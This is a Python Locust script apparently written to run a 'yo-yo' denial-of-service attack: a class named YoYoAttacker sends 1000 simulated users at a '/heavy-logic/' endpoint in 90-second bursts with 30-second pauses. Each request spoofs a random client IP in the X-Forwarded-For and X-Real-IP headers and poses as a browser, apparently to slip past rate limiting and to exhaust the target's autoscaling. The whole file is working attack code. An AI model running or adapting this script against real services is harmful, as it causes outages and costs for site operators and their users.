import random
import urllib3
from locust import HttpUser, task, constant, LoadTestShape

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class YoYoAttacker(HttpUser):
    wait_time = constant(0)

    def _random_ip(self):
        """Generate a random public IP address for spoofing."""
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    @task
    def attack_heavy(self):
        spoofed_ip = self._random_ip()
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "X-Forwarded-For": spoofed_ip,
            "X-Real-IP": spoofed_ip,
        }
        self.client.get("/heavy-logic/", headers=headers, verify=False)


class YoYoShape(LoadTestShape):
    CYCLE_TIME = 120 

    def tick(self):
        run_time = self.get_run_time()
        current_step = int(run_time) % self.CYCLE_TIME

        if current_step < 90: 
            return (1000, 100) #user, ramp up
        else:                  
            return (0, 50) #user, ramp down